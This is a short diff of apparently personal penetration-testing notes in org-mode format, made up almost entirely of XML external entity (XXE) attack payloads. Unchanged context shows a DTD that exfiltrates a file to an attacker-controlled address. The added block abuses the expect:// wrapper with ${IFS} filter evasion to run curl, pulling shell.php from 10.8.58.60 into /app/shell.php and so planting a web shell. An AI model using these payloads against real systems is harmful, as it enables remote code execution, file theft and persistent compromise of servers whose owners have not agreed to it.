@@ -207,3 +207,17 @@ RewriteRule ^api/$ /index.php/api [L,QSA]%
 <!ENTITY % dtd2 "<!ENTITY exfil SYSTEM 'http://10.8.58.60:8889/?data=%file;'>">
 %dtd2;
 #+end_src
+
+
+#+begin_src xml
+<?xml version="1.0" ?>
+<!DOCTYPE UserData [
+<!ENTITY xxe SYSTEM "expect://curl${IFS}'http://10.8.58.60:8888/shell.php'${IFS}-o${IFS}/app/shell.php">
+]>
+<UserData>
+  <UserInformation>
+    <UserName>&xxe;</UserName>
+    <Country>Canada</Country>
+  </UserInformation>
+</UserData>
+#+end_src
